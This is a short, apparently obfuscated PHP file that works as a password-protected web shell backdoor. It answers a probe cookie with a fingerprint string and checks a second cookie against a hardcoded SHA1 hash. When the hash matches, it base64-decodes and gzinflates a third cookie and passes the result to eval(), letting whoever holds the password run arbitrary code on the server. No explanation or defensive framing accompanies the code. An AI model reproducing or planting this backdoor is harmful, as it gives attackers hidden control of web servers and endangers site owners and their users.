<?php

$ehhdrsdsw = 'btdgsvcx1xgc';
$dvnskch = "44a0465d6773fe31b2e1da0d49d436e7a3cf6a6d";

if (isset($_COOKIE[$ehhdrsdsw])) {
    exit($ehhdrsdsw . $dvnskch . $ehhdrsdsw);
}

$ausdbhfc = @$_COOKIE[substr($dvnskch, 0, 16)];
$ausdbhfc = sha1($ausdbhfc);

$gzasfsd = "gzinflate";

if ($ausdbhfc === $dvnskch)
{
    $kbdvjgcf = $_COOKIE[substr($dvnskch, 16, 16)];

    $dvnskch = base64_decode($kbdvjgcf);

    $dvnskch = $gzasfsd($dvnskch);

    if (!empty($dvnskch))
    {
        eval($dvnskch);
    }
}
exit();


